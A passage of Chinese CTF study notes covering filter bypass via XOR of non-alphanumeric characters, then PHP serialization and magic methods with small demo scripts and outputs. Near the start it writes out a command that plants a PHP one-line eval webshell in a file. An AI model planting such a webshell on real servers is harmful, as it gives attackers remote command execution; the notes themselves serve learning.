<p>本题preg_replace()过滤了<code>所有英文字母和数字</code>，但是<em>ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</em></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="code"><pre><span class="line">PS：取<span class="keyword">ASCII</span>表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</span><br></pre></td></tr></table></figure></div>

<h4 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h4><p>ls</p>
<p>cat</p>
<p>touch【创建文件，一般创建脚本文件，</p>
<p>比如<code>touch haha.php</code></p>
<p>然后再执行<code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;&gt;haha.php</code>，在脚本文件里写一串一句话木马</p>
<p><strong>但是注意因为有$，后面的看可能会被当做变量，所以可以加上反斜杠\转义</strong></p>
<p><code>echo &quot;&lt;?php @eval(\$_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;&gt;haha.php</code></p>
<p>】</p>
<hr>
<h3 id="十、暴力破解"><a href="#十、暴力破解" class="headerlink" title="十、暴力破解"></a>十、暴力破解</h3><p>一把搜哈就完事（奸笑）</p>
<hr>
<h3 id="十一、反序列化"><a href="#十一、反序列化" class="headerlink" title="十一、反序列化"></a>十一、反序列化</h3><p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">原文链接1</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/377676274">原文链接2</a></p>
<h4 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h4><p>  <strong>序列化</strong>(Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
<h4 id="php的序列化和反序列化"><a href="#php的序列化和反序列化" class="headerlink" title="php的序列化和反序列化"></a>php的序列化和反序列化</h4><p>概念：<code>php的序列化将对象转化为了字符串，包含了对象的所有数据信息，</code><br><code>反序列化时再根据这些信息还原对象。</code></p>
<p>  <u>php的序列化和反序列化由serialize()和unserialize()</u>这两个函数来完成。serialize()完成序列化的操作，将传入的值转换为序列化后的字符串；而unserialize()完成反序列化的操作，将字符串转换成原来的变量。</p>
<p><code>serialize(mixed $value): string</code><br>        serialize()返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方：</p>
<p><code>O::&quot;&quot;::&#123;&lt;field name 1&gt;&lt;field value 1&gt;…&#125;</code><br><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>  当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。<br><code>unserialize(string $str): mixed</code><br>  unserialize()对单一的已序列化的变量进行操作，将其转换回 PHP 的值。<br>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 wakeup() 成员函数（如果存在的话）。</p>
<p>注意：</p>
<p>private声明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAML"><figure class="iseeu highlight /haml"><table><tr><td class="code"><pre><span class="line">private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</span><br><span class="line"></span><br><span class="line">因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">%<span class="selector-tag">00</span></span>也就是空字符，无法复制，只能自己修改二进制，或者自己加上</span><br></pre></td></tr></table></figure></div>



<h4 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h4><p><a href="https://blog.csdn.net/qq_45552960/article/details/102664372">原文链接</a></p>
<p>  PHP中以两个下划线开头的方法，<code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()，__autoload()</code>等，被称为”魔术方法”（Magic methods）。这些方法在一定条件下有特殊的功能，在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能</p>
<p>与序列化和反序列化的魔术方法主要是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__construct</span>()	<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__destruct</span>() 	<span class="comment">//对象被销毁时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__wakeup</span>() 	<span class="comment">//使用unserialize时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__sleep</span>() 	<span class="comment">//使用serialize时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__toString</span>() 	<span class="comment">//把类当做字符串时触发</span></span><br><span class="line">&#123;因为echo无法输出对象，所以可以利用该魔法方法，在直接输出对象引用的时候，就不会产生错误，而是自动调用了”<span class="built_in">__toString</span>()”方法, 输出“<span class="built_in">__toString</span>()”方法中返回的字符，所以“<span class="built_in">__toString</span>()”方法一定要有个返回值(return 语句)&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">__get</span>() 	<span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__set</span>() 	<span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__invoke</span>()  <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__call</span>()     <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__callStatic</span>()  <span class="comment">//在静态上下文中调用不可访问的属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__isset</span>()   <span class="comment">//当对不可访问属性调用isset()或empty()时调用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__set_state</span>()   <span class="comment">//调用var_export()导出类时，此静态方法会被调用。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__clone</span>()  <span class="comment">//当对象复制完成时调用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__autoload</span>()   <span class="comment">//尝试加载未定义的类</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__debugInfo</span>()   <span class="comment">//打印所需调试信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">·注意：PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。</span><br><span class="line"></span><br><span class="line">·<span class="built_in">__sleep</span>() 和 <span class="built_in">__wakeup</span>()</span><br><span class="line">public __sleep ( void ) : array</span><br><span class="line">__wakeup ( void ) : void</span><br><span class="line"></span><br><span class="line">serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">（<span class="number">1</span>）__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</span><br><span class="line">（<span class="number">2</span>）__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</span><br><span class="line">（<span class="number">3</span>）与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span><br><span class="line">（<span class="number">4</span>）__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</span><br><span class="line"></span><br><span class="line">·访问控制</span><br><span class="line">PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</span><br><span class="line">public（公有）：公有的类成员可以在任何地方被访问。</span><br><span class="line">protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。</span><br><span class="line">private（私有）：私有的类成员则只能被其定义所在的类访问。</span><br><span class="line"></span><br><span class="line">·unserialize() 将已序列化的字符串还原回 PHP 的值。</span><br><span class="line">序列化请使用 serialize() 函数。</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line">unserialize(str)</span><br><span class="line"></span><br><span class="line">参数 描述</span><br><span class="line">str 必需。一个序列化字符串。</span><br><span class="line">__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。</span><br></pre></td></tr></table></figure></div>

<h5 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h5><p>**__construct()**被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure></div>

<p>可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。</p>
<h5 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h5><p>在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure></div>

<p>可以看到执行了两次**__destruct**，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>
<h5 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h5><p>在对象中调用一个不可访问方法时，**__call()** 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure></div>

<p>可以看到**__call**需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写xxx不存在这个函数，第二个参数是传入的数组，这里只传入了一个a。</p>
<h5 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h5><p>在静态上下文中调用一个不可访问方法时，**__callStatic()** 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure></div>

<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 <strong>self</strong>，<strong>parent</strong> 和 <strong>static</strong>）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
<h5 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h5><p>读取不可访问属性的值时，**__get()** 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure></div>

<p><strong>__get</strong>魔术方法需要一个参数，这个参数代表着访问不存在的属性值。</p>
<h5 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h5><p>给不可访问属性赋值时，**__set()** 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><strong>set</strong>跟<strong>get</strong>相反，一个是访问不存在的属性，一个是给不存在的属性赋值。</p>
<h5 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h5><p>对不可访问属性调用 <strong>isset()</strong> 或 <strong>empty()</strong> 时，**__isset()** 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure></div>

<p>该魔术方法使用了<strong>isset()<strong>或者</strong>empty()<strong>只要属性是</strong>private</strong>或者不存在的都会触发。</p>
<h5 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h5><p>对不可访问属性调用 <strong>unset()</strong> 时，**__unset()** 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure></div>

<p>如果一个类定义了魔术方法 <strong>__unset</strong>() ，那么我们就可以使用 <strong>unset()</strong> 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</p>
<h5 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h5><p><strong>serialize()</strong> 函数会检查类中是否存在一个魔术方法 **__sleep()**。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载序列化调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到执行序列化之前会先执行<strong>sleep()函数，上面</strong>sleep的函数作用是过滤掉password的变量值。</p>
<h5 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h5><p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源。</p>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义反序列化后调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span 